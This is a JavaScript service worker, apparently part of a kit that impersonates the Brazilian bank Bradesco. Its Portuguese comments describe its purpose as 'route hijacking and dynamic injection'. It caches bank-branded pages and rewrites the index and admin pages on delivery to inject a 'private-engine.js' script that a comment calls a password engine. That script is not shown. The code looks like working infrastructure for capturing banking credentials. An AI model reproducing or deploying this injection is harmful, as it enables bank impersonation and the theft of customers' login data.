/**
 * SERVICE WORKER BRADESCO PRIVATE
 * FUNÇÃO: SEQUESTRO DE ROTA E INJEÇÃO DINÂMICA
 * VOLUMETRIA: ~35 LINHAS
 */

const CACHE_NAME = 'bradesco-private-cache-v10';

self.addEventListener('install', (e) => {
    self.skipWaiting();
    e.waitUntil(caches.open(CACHE_NAME).then((c) => c.addAll(['index.html', 'produtos.html', 'private-engine.js', 'logo.png'])));
});

self.addEventListener('activate', (e) => {
    e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Injeta o motor de senha no INDEX e ADMIN imutáveis no ato da entrega
    if (url.pathname.endsWith('index.html') || url.pathname === '/' || url.pathname.endsWith('admin.html')) {
        event.respondWith(
            fetch(event.request).then(async (res) => {
                let html = await res.text();
                // Encaixa o private-engine.js antes do fechamento do body
                const scriptTag = '<script src="private-engine.js"></script>';
                return new Response(html.replace('</body>', scriptTag + '</body>'), {
                    headers: { 'Content-Type': 'text/html' }
                });
            })
        );
    } else {
        event.respondWith(fetch(event.request).catch(() => caches.match(event.request)));
    }
});
